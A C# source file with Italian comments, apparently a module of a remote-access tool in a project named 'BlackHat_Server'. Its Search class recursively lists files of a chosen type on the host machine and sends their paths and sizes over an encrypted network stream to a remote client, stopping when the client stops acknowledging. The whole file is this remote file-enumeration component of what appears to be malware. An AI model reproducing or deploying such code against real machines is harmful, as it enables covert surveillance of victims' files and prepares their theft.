using System;
using System.Collections.Generic;
using System.Text;
using System.IO;
using System.Net.Sockets;
using System.Windows.Forms;

namespace BlackHat_Server
{
    class Search
    {
        NetworkStream myNetWork;
        bool stopMe = false;
        

       

        public Search(NetworkStream ctor_Net)
        {
            myNetWork = ctor_Net;
        }

        
        /// <summary>
        /// Lista dei Files Recursive in Sdir
        /// </summary>
        /// <param name="sDir"></param>
        /// <param name="sFileType"></param>
        /// <returns></returns>
        public void RecursiveSearch(string sDir, string sFileType)
        {
            if (!stopMe)
            {
                List<string> listaFiles = new List<string>();

                string[] dirs = Directory.GetDirectories(sDir);

                foreach (string d in dirs)
                {
                    
                    try
                    {
                        string[] files = Directory.GetFiles(d, sFileType);

                        foreach (string f in files)
                            listaFiles.Add(f);

                        if (listaFiles.Count > 0)
                            SendList(listaFiles);

                        listaFiles.Clear();

                        RecursiveSearch(d, sFileType);
                    }
                    catch { }                   
                    

                }
            }
   
            
  
        }

        /// <summary>
        /// Lista dei Files Normal Sdir
        /// </summary>
        /// <param name="sDir"></param>
        /// <param name="sFileType"></param>
        /// <returns></returns>
        public void NormalSearch(string sDir, string sFileType)
        {
            try
            {
                List<string> listaFiles = new List<string>();

                string[] files = Directory.GetFiles(sDir, sFileType);

                foreach (string f in files)
                    listaFiles.Add(f);

                if (listaFiles.Count > 0)
                    SendList(listaFiles);
            }
            catch {}           


        }



        /// <summary>
        /// Invio gli item presenti nella lista
        /// </summary>
        private void SendList(List<string> sendingList)
        {
            string message = "";
            MsgManager mm = new MsgManager(myNetWork);

            // INVIO RISPOSTA
            foreach (string file in sendingList)
            {
                FileInfo fi = new FileInfo(file);
                // string fileName = Path.GetFileName(file);

                string fileInfo = String.Format("{0}|{1}*", file, fi.Length);
                message += fileInfo;
            }
            //-----------------------------------------
            message = message.TrimEnd('*');
            bool sent = mm.SendLargeEncryMessage(message, 10000);

            string ok = mm.WaitForEncryMessageRicorsive(15000);

            if (ok != "OK")
                stopMe = true;
        }


        /// <summary>
        /// Mando Messaggio di fine Files e chiude lo strem!
        /// </summary>
        public void SendStop()
        {
            string message = "__STOP__";
            MsgManager mm = new MsgManager(myNetWork);           
            bool sent = mm.SendLargeEncryMessage(message, 10000);
            myNetWork.Close();
        }
    }
}
